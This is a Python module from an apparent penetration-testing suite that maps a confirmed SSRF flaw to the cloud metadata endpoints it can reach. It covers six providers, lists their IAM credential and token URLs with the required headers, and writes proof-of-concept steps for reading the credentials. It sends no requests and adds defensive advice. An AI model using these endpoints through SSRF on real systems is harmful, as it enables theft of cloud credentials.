"""[SAFETY: read-only, NOL jaringan] ssrf_metadata_map — pemeta permukaan
SSRF -> metadata cloud (IMDS) dari primitif SSRF yang SUDAH terkonfirmasi
(CWE-918). TIDAK mengirim apa pun; hanya memetakan endpoint yang RELEVAN
dengan kemampuan primitif yang diberikan.

Konsep SSRF->IMDS (AWS/GCP/Azure/DO/Alibaba/Oracle) — dibangun FROM SCRATCH,
stdlib murni, offline.

Ceruk vs modul lain (anti-duplikasi):
  - exploit_playbooks `SsrfCallback` = LIVE (kirim, tangkap OOB). `egress_
    preflight` = kebijakan egress. Tool ini memetakan endpoint IMDS yang bisa
    dicapai GIVEN kemampuan primitif, dengan GET persis sebagai lead.

"Kejar sampai verdict": endpoint yang BISA dicapai dengan kemampuan primitif
=> L1 LEAD `lab_only` + GET persis (next-step = kirim via SSRF, baca kredensial).
Endpoint yang BUTUH header sedangkan primitif tak bisa set header => L0
(tak-tercapai dengan kemampuan ini — jujur, bukan klaim).

Input -> mekanisme -> output:
  - Input : --provider aws|gcp|azure|digitalocean|alibaba|oracle (diulang /
            `all`); --capability plain-get|header-control (apa yang bisa
            dilakukan primitif SSRF); --target-url (konteks, opsional).
  - Output: JSON kontrak; --out; --fail-on. Exit 0/1/2.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "core"))
from findings import make_finding, write_findings  # noqa: E402

SCHEMA = "cyphron.ssrf-metadata-map/1"
TOOL = "ssrf-metadata-map"

# endpoint: (nama, metode, url, butuh_header, header, catatan)
PROVIDERS = {
    "aws": [
        ("imdsv1-creds", "GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         False, "", "IMDSv1 IAM role credentials (no header)"),
        ("imdsv1-userdata", "GET", "http://169.254.169.254/latest/user-data/",
         False, "", "instance user-data (often holds secrets)"),
        ("imdsv2-token", "PUT", "http://169.254.169.254/latest/api/token",
         True, "X-aws-ec2-metadata-token-ttl-seconds: 21600",
         "IMDSv2 needs a PUT + token header first"),
    ],
    "gcp": [
        ("sa-token", "GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         True, "Metadata-Flavor: Google", "service-account OAuth token"),
    ],
    "azure": [
        ("imds-token", "GET", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         True, "Metadata: true", "managed-identity token"),
    ],
    "digitalocean": [
        ("metadata", "GET", "http://169.254.169.254/metadata/v1/",
         False, "", "droplet metadata (no header)"),
    ],
    "alibaba": [
        ("metadata", "GET", "http://100.100.100.200/latest/meta-data/",
         False, "", "ECS metadata (no header)"),
    ],
    "oracle": [
        ("instance", "GET", "http://169.254.169.254/opc/v2/instance/",
         True, "Authorization: Bearer Oracle", "OCI instance metadata"),
    ],
}


def analyze(providers: list[str], capability: str, target_url: str = "") -> dict:
    cap = (capability or "plain-get").strip().lower()
    if cap not in ("plain-get", "header-control"):
        raise ValueError("capability harus plain-get|header-control")
    if "all" in providers:
        providers = list(PROVIDERS)
    bad = [p for p in providers if p not in PROVIDERS]
    if bad:
        raise ValueError("provider tak dikenal: %s" % ", ".join(bad))
    if not providers:
        raise ValueError("minimal satu --provider")
    findings: list[dict] = []
    unreachable: list[str] = []
    for prov in providers:
        for name, method, url, needs_hdr, hdr, note in PROVIDERS[prov]:
            reachable = (not needs_hdr) or cap == "header-control"
            tag = "%s/%s" % (prov, name)
            if reachable:
                req = "%s %s" % (method, url)
                if needs_hdr:
                    req += "\n%s" % hdr
                poc = ("reachable with capability '%s':\n%s\nnext-step (LIVE, "
                       "not done here): drive this GET through the confirmed "
                       "SSRF primitive and read the response (credentials/token)."
                       % (cap, req))
                findings.append(make_finding(
                    tool=TOOL,
                    title="SSRF can reach %s metadata: %s" % (prov.upper(), name),
                    severity="high", cwe="CWE-918",
                    description=("%s. Given a '%s' SSRF primitive, this endpoint "
                                 "is reachable and would expose %s."
                                 % (note, cap, note)),
                    recommendation=("Enforce IMDSv2/hop-limit; block link-local "
                                    "169.254.0.0/16 egress; least-privilege roles."),
                    target_url=target_url or url, param=tag,
                    status="unconfirmed", verdict=1, evidence_kind="payload",
                    confidence=0.7, lab_only=True, poc=poc,
                    extra={"kind": "ssrf", "provider": prov, "endpoint": name,
                           "needs_header": needs_hdr}))
            else:
                unreachable.append(tag)
    if unreachable:
        findings.append(make_finding(
            tool=TOOL,
            title="Metadata endpoints NOT reachable with capability '%s'" % cap,
            severity="info",
            description=("These need a request header the primitive cannot set: "
                         "%s (unreachable given this capability — not a claim)."
                         % ", ".join(sorted(unreachable))),
            recommendation="If the primitive gains header control, re-check.",
            param="unreachable", status="confirmed", verdict=0, evidence_kind="",
            confidence=0.8, extra={"kind": "summary"}))
    if not findings:
        findings.append(make_finding(
            tool=TOOL, title="No reachable metadata endpoint mapped",
            severity="info", description="No endpoints for the given providers/"
            "capability (checked, nothing found).", recommendation="n/a",
            param="summary", status="confirmed", verdict=0, evidence_kind="",
            confidence=0.6, extra={"kind": "summary"}))
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda f: (sev_order[f["severity"]], f.get("param") or ""))
    stats = {"providers": sorted(providers), "capability": cap,
             "reachable": sum(1 for f in findings if f.get("kind") == "ssrf"),
             "findings": len(findings)}
    return {"schema": SCHEMA, "tool": TOOL, "stats": stats, "notes": [],
            "findings": findings}


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Map an SSRF primitive to reachable cloud metadata endpoints "
                    "— offline, capability-gated.")
    ap.add_argument("--provider", action="append", default=[],
                    help="aws|gcp|azure|digitalocean|alibaba|oracle|all")
    ap.add_argument("--capability", default="plain-get",
                    choices=["plain-get", "header-control"])
    ap.add_argument("--target-url", default="")
    ap.add_argument("--out")
    ap.add_argument("--fail-on", default="none",
                    choices=["none", "any", "high", "medium", "low"])
    args = ap.parse_args(argv)
    if not args.provider:
        print("[ssrf-metadata-map] input error: minimal satu --provider", file=sys.stderr)
        return 2
    try:
        result = analyze(args.provider, args.capability, args.target_url)
    except ValueError as exc:
        print("[ssrf-metadata-map] input error: %s" % exc, file=sys.stderr)
        return 2
    result["requests"] = 0
    if args.out:
        write_findings(args.out, result["findings"], meta={
            "schema": SCHEMA, "tool": TOOL, "stats": result["stats"],
            "notes": [], "requests": 0})
    print(json.dumps(result, ensure_ascii=False, indent=2, sort_keys=True))
    if args.fail_on == "none":
        return 0
    if args.fail_on == "any":
        return 1 if any(f["severity"] != "info" for f in result["findings"]) else 0
    need = {"high": {"critical", "high"},
            "medium": {"critical", "high", "medium"},
            "low": {"critical", "high", "medium", "low"}}[args.fail_on]
    return 1 if any(f["severity"] in need for f in result["findings"]) else 0


if __name__ == "__main__":
    sys.exit(main())
